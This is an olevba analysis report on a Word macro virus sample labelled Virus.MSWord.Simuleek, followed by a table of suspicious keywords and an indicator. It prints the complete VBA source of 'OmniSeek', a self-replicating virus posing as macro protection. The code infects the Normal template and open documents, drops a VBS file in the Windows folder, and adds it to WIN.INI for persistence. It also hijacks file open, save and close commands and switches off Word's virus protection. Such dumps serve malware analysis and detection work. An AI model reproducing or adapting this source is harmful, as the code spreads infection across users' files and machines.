olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Simuleek-d6859c3e8051d1f60b6486ad8ae6ccc8722c87bd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Simuleek-d6859c3e8051d1f60b6486ad8ae6ccc8722c87bd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO OmniSeek.bas 
in file: Virus.MSWord.Simuleek-d6859c3e8051d1f60b6486ad8ae6ccc8722c87bd - OLE stream: 'Macros/VBA/OmniSeek'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Mabuhay, mga kababayan ko sa iba't-ibang panig ng mundo!
' Sana ay maibigan nyo ang obra-maestrang ito.
'
' OmniSeek v0.1  May 28,2001
'   This is the OmniSeek (TM) Macro Protection System.
'   OmniSeek protects your WINWORD .doc files from harmful/mischievous
'   macro codes by checking every macros in each document you open.
'   Everytime you open a document, it examines its macro content and
'   determines if it has virus-like procedures. Every macros that
'   OmniSeek suspects as virus-like will be deleted from the document.
'   Whenever OmniSeek deletes a macro virus, it copies itself to the
'   infected document and assumes the name of the deleted virus. This
'   behavior is called "Virus Name Active Innoculation", because some
'   macro virus does not re-infect a document if they see their names
'   on it. OmniSeek does not delete macros which pass its examinations.
'   OmniSeek incorporates viral-capability to seek out harmful
'   macro virus. But unlike macro virus, OmniSeek does not disable any
'   toolbar or menu controls. So you can easily see OmniSeek's code
'   or delete OmniSeek if you don't like it. However, OmniSeek does
'   not undo any customizations that a harmful macro virus introduces
'   to your WINWORD.
'
'   OmniSeek is a creation of a Filipino mind.
'
'   ooxo ooox ooxx oxxo oxoo oxoo oxxo oooo
'

Option Explicit
Public wrd, windir, f, teks, seyba

'Simula 12/09/02 6:22:14 PM
Sub Simula(x)
 On Error Resume Next
 If InitVBS(1) And GetIn(1) <> 2 Then wrd.OnTime Now + TimeValue("00:00:02"), "MeShutDown", 0
 Set wrd = Nothing
 WScript.Quit
End Sub

Function InitVBS(x)
 Dim wsh, i, j, fl, fnm, txt
 On Error Resume Next
 InitVBS = False
 Set wsh = WScript.Application
 fnm = wsh.ScriptFullName
 windir = getWindir(1)
 If Err Or windir = "" Then Exit Function
 Set f = CreateObject("Scripting.FileSystemObject")
 txt = readTxt(fnm, True)
 fnm = f.buildpath(windir, "OmniSeek.vbs")
 writeTxt fnm, txt
 i = InStr(txt, "Simula")
 j = InStr(txt, "Sub Simula(x)")
 teks = Left(txt, i - 1) + "'Simula " + CStr(Now) + vbCrLf + Mid(txt, j)
 insertINI (1)
 Set wrd = CreateObject("Word.Application")
 fnm = wrd.NormalTemplate.FullName
 wrd.NormalTemplate.Saved = True
 wrd.Quit
 Set i = f.getfile(UCase(fnm))
 i.Attributes = 0
 InitVBS = True
End Function

Function getWindir(x)
 Dim wshl, env
 On Error Resume Next
 Set wshl = CreateObject("Wscript.Shell")
 Set env = wshl.Environment("PROCESS")
 getWindir = env("WINDIR")
 Set wshl = Nothing
 Set env = Nothing
 If Err Then getWindir = ""
End Function

Function readTxt(fnm, delete)
 Dim f, fl, txt, i
 On Error Resume Next
 Set f = CreateObject("Scripting.FileSystemObject")
 fnm = UCase(fnm)
 Set fl = f.getfile(fnm)
 fl.Attributes = 0
 On Error Resume Next
 Set fl = f.OpenTextFile(fnm, 1)
 txt = fl.readall
 For i = 0 To 9
  If Asc(Mid(txt, Len(txt), 1)) < 32 Then txt = Mid(txt, 1, Len(txt) - 1) Else Exit For
 Next
 fl.Close
 If Err Then
  readTxt = ""
 Else
  readTxt = txt
  If delete Then f.deletefile fnm, True
 End If
End Function

Function writeTxt(fnm, txt)
 Dim f, fl
 On Error Resume Next
 Set f = CreateObject("Scripting.FileSystemObject")
 fnm = UCase(fnm)
 Set fl = f.getfile(fnm)
 fl.Attributes = 0
 On Error Resume Next
 writeTxt = True
 Set fl = f.createtextfile(fnm, True)
 fl.write txt
 fl.Close
 If Err Then writeTxt = False
 Set fl = f.getfile(fnm)
 fl.Attributes = 2
End Function

Function insertINI(x)
 Dim fnm, txt, ini, i, j
 On Error Resume Next
 insertINI = False
 Set f = CreateObject("Scripting.FileSystemObject")
 fnm = f.buildpath(windir, "WIN.INI")
 txt = readTxt(fnm, True)
 If txt = "" Then Exit Function
 ini = UCase(txt)
 i = InStr(ini, vbLf + "RUN=")
 j = InStr(i + 1, ini, vbLf)
 writeTxt fnm, Mid(txt, 1, i) + "run=" + f.buildpath(windir, "OmniSeek.vbs") + Mid(txt, j - 1)
 If Err Then Exit Function
 insertINI = True
End Function

Function GetIn(x)
 Dim recent, d, fnm
 On Error Resume Next
 Set wrd = CreateObject("Word.Application")
 wrd.WordBasic.disableautomacros
 wrd.Options.VirusProtection = True
 wrd.Options.SaveNormalPrompt = False
 GetIn = 2
 If Err Then Exit Function
 Set recent = wrd.RecentFiles
 wrd.DisplayAlerts = 0
 fnm = UCase(recent(1).Name)
 If recent.Count <> 0 And (InStr(fnm, ".DOC") > 1 Or InStr(fnm, ".DOT") > 1) Then
  fnm = recent(1).Path + wrd.PathSeparator + recent(1).Name
  wrd.WordBasic.SetAttr fnm, 0
  wrd.Documents.Open (fnm)
 End If
 On Error Resume Next
 recent.Maximum = 0
 HawaNa (1)
 SeybNa (1)
 GetIn = 1
 If Err Then Exit Function
 GetIn = 0
End Function

Sub MeShutDown()
 On Error Resume Next
 Application.Quit
End Sub

Function isThreat(c)
 On Error Resume Next
 Dim txt, n
 txt = UCase(c.CodeModule.Lines(1, c.CodeModule.CountOfLines))
 n = UCase(c.Name)
 isThreat = False
 If InStr(txt, "FILENEW(") > 1 Or InStr(txt, "FILEOPEN(") > 1 Or InStr(txt, "FILESAVE(") > 1 Or InStr(txt, "FILESAVEAS(") > 1 Or InStr(txt, "FILECLOSE(") > 1 Then isThreat = True
 If InStr(txt, "AUTOEXEC(") > 1 Or InStr(txt, "AUTOOPEN(") > 1 Then isThreat = True
' If (n = "AUTOEXEC" Or n = "AUTOOPEN" Or n = "AUTOCLOSE" Or n = "AUTOEXIT") And InStr(txt, "MAIN(") Then isThreat = True
End Function

Sub HawaNa(x)
 Dim d, fnm
 On Error Resume Next
 Hawahan wrd.NormalTemplate
 For Each d In wrd.Documents
  fnm = UCase(d.FullName)
  If InStr(fnm, ".DOC") > 1 Or InStr(fnm, ".DOT") > 1 Then Hawahan d
 Next
End Sub

Sub Hawahan(d)
 On Error Resume Next
 Dim comps, c, wala, n, tmp
 Set comps = d.VBProject.VBComponents
 wala = True
 n = "OmniSeek"
 For Each c In comps
  If c.Type = 1 Then
    tmp = UCase(c.CodeModule.Lines(1, c.CodeModule.CountOfLines))
    If Mid(tmp, 3048) = Mid(UCase(teks), 3048) Then
      wala = False
      If d.FullName = wrd.NormalTemplate.FullName Then wrd.NormalTemplate.Saved = True
    ElseIf isThreat(c) Then
      n = c.Name
      comps.Remove c
    End If
  End If
 Next
 If wala Then
  Set c = comps.Add(1)
  c.CodeModule.AddFromString (teks)
  c.Name = n
  seyba = True
 End If
End Sub

Sub startOmni()
 On Error Resume Next
 InitVBA (1)
 ChkVBS (1)
 HawaNa (1)
End Sub

Sub InitVBA(x)
 Dim j, vbcs
 On Error Resume Next
 Set wrd = Application
 RecentFiles.Maximum = 4
 WordBasic.disableautomacros
 seyba = False
 Options.VirusProtection = True
 Options.SaveNormalPrompt = False
 Set vbcs = wrd.MacroContainer.VBProject.VBComponents
 j = vbcs.Count
 teks = vbcs(j).CodeModule.Lines(1, vbcs(j).CodeModule.CountOfLines)
End Sub

Function ChkVBS(x)
 Dim fnm, i, j, txt
 On Error Resume Next
 ChkVBS = False
 Set f = CreateObject("Scripting.FileSystemObject")
 windir = getWindir(1)
 If Err Or windir = "" Then Exit Function
 Set i = f.getfile(UCase(NormalTemplate.FullName))
 i.Attributes = 0
 fnm = f.buildpath(windir, "OmniSeek.vbs")
 If f.FileExists(fnm) Then
  ChkVBS = True
 Else
  i = InStr(teks, "'Simula")
  j = InStr(teks, "Sub Simula(x)")
  txt = Mid(teks, 1, i - 1) + "Simula 1" + vbCrLf + Mid(teks, j)
  writeTxt fnm, txt
  insertINI (1)
 End If
 fnm = f.buildpath(windir, "OFFITEMS.LOG")
 Set i = f.getfile(fnm)
 i.Attributes = 0
 If i.Size > 99999 Then f.deletefile fnm, True
 ChkVBS = True
End Function

Sub SeybNa(x)
 Dim d
 On Error Resume Next
 If seyba Then
  For Each d In wrd.Documents
   If Not d.ReadOnly Then
    d.Save
    d.Close
   Else: d.Close 0
   End If
  Next
  seyba = False
 End If
End Sub

Sub ToolsOptions()
 On Error Resume Next
 Dialogs(wdDialogToolsOptions).Show
 InitVBA (1)
End Sub

Sub ToolsMacro()
 On Error Resume Next
 startOmni
 Dialogs(wdDialogToolsMacro).Show
End Sub

Sub ViewVBCode()
 On Error Resume Next
 startOmni
 ShowVisualBasicEditor = True
End Sub

Sub AutoOpen()
 On Error Resume Next
 startOmni
End Sub

Sub FileOpen()
 On Error Resume Next
 Dim vbcs
 InitVBA (1)
 HawaNa (1)
 With Dialogs(wdDialogFileOpen)
  .Display
  Options.VirusProtection = False
  Set vbcs = NormalTemplate.VBProject.VBComponents
  Application.OnTime Now + TimeValue("00:00:01"), "Normal." + vbcs(vbcs.Count).Name + ".startOmni", 0
  .Execute
 End With
End Sub

Sub FileSave()
 On Error Resume Next
 Dim t
 t = Application.DisplayAlerts
 Application.DisplayAlerts = 0
 If ActiveDocument.Path = "" Then
   Application.DisplayAlerts = t
   FileSaveAs
  Else
   If Not ActiveDocument.Saved Then
    InitVBA (1)
    HawaNa (1)
    ActiveDocument.Save
    ChkVBS (1)
   End If
 End If
 HawaNa (1)
 Application.DisplayAlerts = t
End Sub

Sub FileSaveAs()
 On Error Resume Next
 Dialogs(wdDialogFileSaveAs).Show
 InitVBA (1)
 HawaNa (1)
 ChkVBS (1)
 ActiveDocument.Save
End Sub

Sub FileClose()
 On Error Resume Next
 InitVBA (1)
 HawaNa (1)
 ChkVBS (1)
 ActiveDocument.Close
End Sub

Sub FileExit()
 On Error Resume Next
 startOmni
 SeybNa (1)
 wrd.Quit
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|AutoExec  |AUTOEXIT            |Runs when the Word document is closed        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|createtextfile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|RUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |OmniSeek.vbs        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

